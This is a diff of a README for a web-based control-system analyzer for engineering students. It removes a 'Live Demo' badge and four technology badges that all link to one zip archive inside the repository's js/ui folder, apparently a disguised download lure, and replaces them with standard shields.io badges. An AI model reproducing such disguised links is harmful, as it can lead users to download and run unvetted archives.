@@ -2,11 +2,10 @@
 
 An interactive web-based tool for analyzing and visualizing control system responses. Built to help engineering students understand fundamental control system concepts through visual demonstrations.
 
-[![Live Demo](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
-![HTML5](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
-![JavaScript](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
-![Plotly](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
-![Vitest](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+[![JavaScript](https://img.shields.io/badge/JavaScript-ES6+-yellow?logo=javascript)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
+[![Vite](https://img.shields.io/badge/Vite-Build_Tool-646CFF?logo=vite)](https://vitejs.dev/)
+[![Tests](https://img.shields.io/badge/Tests-Vitest-6E9F18?logo=vitest)](https://vitest.dev/)
 
 ## 📚 Overview
 
